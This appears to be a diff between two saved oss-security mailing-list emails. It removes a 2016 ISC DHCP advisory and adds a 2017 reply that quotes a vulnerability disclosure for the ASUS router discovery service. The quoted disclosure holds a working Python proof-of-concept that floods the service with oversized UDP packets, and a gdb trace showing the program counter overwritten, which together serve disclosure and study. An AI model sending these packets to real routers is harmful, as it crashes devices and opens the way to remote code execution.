@@ -1,9 +1,9 @@
 X-VM-v5-Data: ([nil t nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
-	["1528" "Tuesday" "12" "January" "2016" "16:09:21" "-0600" "ISC Security Officer" "security-officer@isc.org" "<56957991.40706@isc.org>" "44" "[oss-security] ISC DHCP CVE-2015-8605: UDP payload length not properly checked" nil nil nil "1" "2016011222:09:21" "[oss-security] ISC DHCP CVE-2015-8605: UDP payload length not properly checked" (number mark "U       security-off Jan 12   44/1528  " thread-indent "\"[oss-security] ISC DHCP CVE-2015-8605: UDP payload length not properly checked\"\n") nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
+	["5799" "Thursday" "13" "July" "2017" "11:39:01" "-0700" "Zach W" "kestrel@trylinux.us" "<3ad6bf17-b508-db0f-4294-e13a094d9226@trylinux.us>" "175" "Re: [oss-security] CVE-IDs request for ASUS wiress router Remote Command/Code Execution Vulnerability" nil nil nil "7" "2017071318:39:01" "[oss-security] CVE-IDs request for ASUS wiress router Remote Command/Code Execution Vulnerability" (number mark "U       kestrel@tryl Jul 13  175/5799  " thread-indent "\"Re: [oss-security] CVE-IDs request for ASUS wiress router Remote Command/Code Execution Vulnerability\"\n") "<eb6ec6e6-16b6-e155-d536-d2355d4afdd9@gmail.com>" ("<eb6ec6e6-16b6-e155-d536-d2355d4afdd9@gmail.com>") nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
 	nil)
 X-Mozilla-Status: 0000
 X-Mozilla-Status2: 00000000
-Received: (qmail 21752 invoked by uid 550); 12 Jan 2016 22:09:45 -0000
+Received: (qmail 13506 invoked by uid 550); 13 Jul 2017 18:58:03 -0000
 Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
 Precedence: bulk
 List-Post: <mailto:oss-security@lists.openwall.com>
@@ -12,62 +12,194 @@ List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
 List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
 List-ID: <oss-security.lists.openwall.com>
 Reply-To: oss-security@lists.openwall.com
-Received: (qmail 21731 invoked from network); 12 Jan 2016 22:09:44 -0000
-From: ISC Security Officer <security-officer@isc.org>
-To: oss-security@lists.openwall.com
-Cc: ISC Security Officer <security-officer@isc.org>
-X-Enigmail-Draft-Status: N2110
-Message-ID: <56957991.40706@isc.org>
-Date: Tue, 12 Jan 2016 16:09:21 -0600
-User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.10; rv:38.0)
- Gecko/20100101 Thunderbird/38.5.1
+Received: (qmail 3535 invoked from network); 13 Jul 2017 18:39:14 -0000
+To: oss-security@lists.openwall.com, varsleak <varsleak@gmail.com>
+References: <eb6ec6e6-16b6-e155-d536-d2355d4afdd9@gmail.com>
+From: Zach W <kestrel@trylinux.us>
+Message-ID: <3ad6bf17-b508-db0f-4294-e13a094d9226@trylinux.us>
+Date: Thu, 13 Jul 2017 11:39:01 -0700
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.11; rv:52.0)
+ Gecko/20100101 Thunderbird/52.2.1
 MIME-Version: 1.0
-Content-Type: multipart/signed; micalg=pgp-sha256;
- protocol="application/pgp-signature";
- boundary="VPsbiauLRgHcvpxe51lM2f7p9O3gaHdbv"
-Subject: [oss-security] ISC DHCP CVE-2015-8605: UDP payload length not properly checked
+In-Reply-To: <eb6ec6e6-16b6-e155-d536-d2355d4afdd9@gmail.com>
+Content-Type: multipart/alternative;
+ boundary="------------1C46E96E5396AC8AEF2F1533"
+Content-Language: en-US
+Subject: Re: [oss-security] CVE-IDs request for ASUS wiress router Remote
+ Command/Code Execution Vulnerability
 
---VPsbiauLRgHcvpxe51lM2f7p9O3gaHdbv
-Content-Type: text/plain; charset=utf-8
-Content-Transfer-Encoding: quoted-printable
+--------------1C46E96E5396AC8AEF2F1533
+Content-Type: text/plain; charset=gbk
+Content-Transfer-Encoding: 7bit
 
-Please be advised that ISC publicly announced a vulnerability in the
-DHCP software.
+How is this different from CVE-2017-6548?
 
-CVE-2015-8605 is a denial-of-service vector which can potentially be
-exploited against ISC DHCP servers, clients, and relays.  All prior 4.x
-releases of ISC DHCP are vulnerable.  Additionally, ISC DHCP 3.x may
-also be vulnerable, but no testing has been done.
-
-New releases of ISC DHCP, including security fixes for this
-vulnerability, are available at: www.isc.org/downloads/
-
-Release notes can be obtained using the following links:
-
-ftp://ftp.isc.org/isc/dhcp/4.3.3-P1/dhcp-4.3.3-P1-RELNOTES
-ftp://ftp.isc.org/isc/dhcp/4.1-ESV-R12-P1/dhcp-4.1-ESV-R12-P1-RELNOTES
-
---=20
-Brian Conry
-ISC Support
-Acting Security Officer
+Zach W.
 
 
+On 7/12/17 7:57 PM, varsleak wrote:
+> Hello, I review the source of asuswrt-merlin and found a Remote
+> Command/Code Execution, the detail as follows:
+>
+>
+> 1. Vulnerability Details
+>      Affected Vendor:RT-AC5300,RT_AC1900P,RT-AC68U,RT-AC68P,RT-AC88U,
+>      RT-AC66U,RT-AC66U_B1,RT-AC58U,RT-AC56U,RT-AC55U,RT-AC52U,RT-AC51U,
+>      RT-N18U,RT-N66U,RT-N56U,RT-AC3200,RT-AC3100,RT_AC1200GU,
+>      RT_AC1200G,RT-AC1200,RT-AC53,RT-N12HP,RT-N12HP_B1,RT-N12D1,
+>      RT-N12+,RT_N12+_PRO,RT-N16,RT-N300
+>      and Asuswrt-Merlin(https://github.com/RMerl/asuswrt-merlin)
+>      Affected Product: ASUS Wiress Router
+>      Affected Version:  all the latest firmware
+>      Platform: router
+>      Impact: Remote Command/Code Execution
+>      Attack vector: asusdiscorvery service
+>
+> 2. Vulnerability Description
+>      When an ASUS router discovers another router device,
+>      it does not buffer the size of all discovered devices
+>      when it is added to the device list to cause a stack overflow,
+>      resulting in a remote code/command execution vulnerability.
+>      The vulnerability code is as follows:
+>
+> https://github.com/RMerl/asuswrt-merlin/blob/master/release/src/router/networkmap/ASUS_Discovery.c#L184-L202
+>
+> 3. PoC:
+> <<<EOF
+> # coding=utf-8
+>
+> import time
+> import socket
+> import sys
+> import os
+> import threading
+> import struct
+> import random
+> import time
+> ''' Please run PoC first, and it must run on windows '''
+> class ASUSDiscoveryBufferOverflow:
+> 	""" set remote host and remote port to use exp """
+> 	def __init__(self, RHOST, RPORT, LHOST):
+> 		self.RHOST = RHOST
+> 		self.RPORT = RPORT
+> 		self.LHOST = LHOST
+> 	
+> 	def exploit(self):
+> 		""" execute exploit """
+> 		self.searchDevice()
+> 		self.sentShellCode()
+> 		
+> 	def searchDevice(self, socket_prot = socket.IPPROTO_UDP):
+> 		""" search ASUS Discovery packet """
+> 		print("    [-] try to search ASUS Discovery packet")
+> 		while(True):
+> 			sniffer = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket_prot)
+> 			sniffer.bind((self.LHOST, 0))
+> 			sniffer.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
+> 			if os.name == 'nt':
+> 				sniffer.ioctl(socket.SIO_RCVALL, socket.RCVALL_ON)
+>
+> 			pkt, hosts = sniffer.recvfrom(65565)
+> 			
+> 			if self.RHOST == hosts[0] and '\x11' == pkt[9]:
+> 				if (pkt[28] == '\x0C' and
+> 				pkt[29] == '\x15' and
+> 				pkt[30] == '\x1F' ):
+> 					print("    [+] bingo!")
+> 					break
+>
+> 	def sentShellCode(self):
+> 		s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+> 		
+> 		for i in range(15):
+> 			s.sendto(self.makeShellCode(), (self.RHOST, self.RPORT))
+> 			print(" [-] sent %d cycle" % (i + 1))
+> 			time.sleep(0.2)
+> 	
+> 	def generatingRandomMacAddr(self):
+> 		tmp1 = random.randint(0, 0xff)
+> 		tmp2 = random.randint(0, 0xff)
+> 		tmp3 = random.randint(0, 0xff)
+> 		tmp4 = random.randint(0, 0xff)
+> 		tmp5 = random.randint(0, 0xff)
+> 		tmp6 = random.randint(0, 0xff)
+> 		return struct.pack('6B', \
+> 			tmp1, tmp2, tmp3, tmp4, tmp5, tmp6)
+> 			
+> 	def makeShellCode(self):	
+> 		shellcode = "\x0c\x16\x1f\x00" # HEADER [ PLEASE NOT MODIFY ]
+> 		shellcode += (128 * b'A') # PKT_GET_INFO.PrinterInfo
+> 		shellcode += (32 * b'A')  # PKT_GET_INFO.SSID
+> 		shellcode += (32 * b'A')  # PKT_GET_INFO.NetMask
+> 		shellcode += (32 * b'A')  # PKT_GET_INFO.ProductID
+> 		shellcode += (16 * b'A')  # PKT_GET_INFO.FirmwareVersion
+> 		shellcode += b'A'		 # PKT_GET_INFO.OperationMode
+> 		shellcode += self.generatingRandomMacAddr() # PKT_GET_INFO.MacAddress	
+> 		shellcode += (261 * b'A') #
+>
+> 		return shellcode
+> 		
+> def main():
+> 	poc = ASUSDiscoveryBufferOverflow('192.168.2.1', 9999, '127.0.0.1')
+> 	
+> 	print("[+] Try to use exploit ...")
+> 	
+> 	poc.exploit()
+> 	
+> 	print("[+] use exploit sucessful.")
+>
+> if __name__ == '__main__':
+> 	main()
+> EOF;
+>
+> 4. gdb trace
+> admin@RT-N12HP_B1:/tmp/bin# gdb /usr/sbin/asusdiscovery
+>
+> GNU gdb 6.8
+> Copyright (C) 2008 Free Software Foundation, Inc.
+> License GPLv3+: GNU GPL version 3 or later
+> <http://gnu.org/licenses/gpl.html>
+> This is free software: you are free to change and redistribute it.
+> There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
+> and "show warranty" for details.
+> This GDB was configured as "mipsel-linux"...
+> I'm sorry, Dave, I can't do that.  Symbol format `elf32-tradlittlemips'
+> unknown.
+> (gdb) r
+> Starting program: /usr/sbin/asusdiscovery
+>
+> Program received signal SIGSEGV, Segmentation fault.
+> 0x41414141 in ?? ()
+> (gdb) info r
+>           zero       at       v0       v1       a0       a1       a2
+>   a3
+>  R0   00000000 00000000 303e3134 00423a80 7fd650e8 00000001 00001000
+> 00423a80
+>             t0       t1       t2       t3       t4       t5       t6
+>   t7
+>  R8   00423000 00423000 00000581 3a31343a 41414141 2ab89124 41414141
+> 2ab0fe10
+>             s0       s1       s2       s3       s4       s5       s6
+>   s7
+>  R16  41414141 41414141 41414141 41414141 41414141 41414141 41414141
+> 41413e41
+>             t8       t9       k0       k1       gp       sp       s8
+>   ra
+>  R24  00000014 2ab6ad70 7fd65f66 00000000 0041c050 7fd65d30 41414141
+> 41414141
+>         status       lo       hi badvaddr    cause       pc
+>       01009c13 0000035d 00000070 41414140 00000008 41414141
+>           fcsr      fir  restart
+>       00000000 00000000 00000000
+>
+> As we have seen, the registers s0-s8,t4,t6,ra and pc are overwritten by
+> 0x41.
+>
+> Finally, with the ROP can lead to Remote Command Execution.
+>
+> 5. Discover
+>     varsleak of Sichuan Silent Information Technology Co., Ltd
+>     company website: http://www.silence.com.cn/
 
---VPsbiauLRgHcvpxe51lM2f7p9O3gaHdbv
-Content-Type: application/pgp-signature; name="signature.asc"
-Content-Description: OpenPGP digital signature
-Content-Disposition: attachment; filename="signature.asc"
 
------BEGIN PGP SIGNATURE-----
-
-iQEcBAEBCAAGBQJWlXmZAAoJEL2X3GOe6MR7cFYH/ji6jsnfcPF82fckFV1uP1wS
-8OYQ0BrLJQgYWcoeWoAxwKipC7OSHPfSAP9afqWzFU2OEnY4gF5Rny7cXm3nMxBg
-Yri4pOee3NyMmG4DyLP5/Jadq3neFbttFqJGv42nsh/gMsgB9OwivYx5seHjXE39
-WnaPz4j8Ha8Gje8QBn2Z6XgnSPBvWfyUXv5zLtURFcVFj4crGTMrbbHnJ04IvNSQ
-hdq5KwBzJKr/WzZJ93wh/1hfx1wt3dmSN6bURhybHBOLDKtrEXZaDUzKMSxUaXbS
-O0YoHde/q/mTkNYCnDhDMEEVIKyZ9261EBj1Ij2K+DDHxKMudLhoe9oYfCvRP+o=
-=UH3t
------END PGP SIGNATURE-----
-
---VPsbiauLRgHcvpxe51lM2f7p9O3gaHdbv--
+--------------1C46E96E5396AC8AEF2F1533--
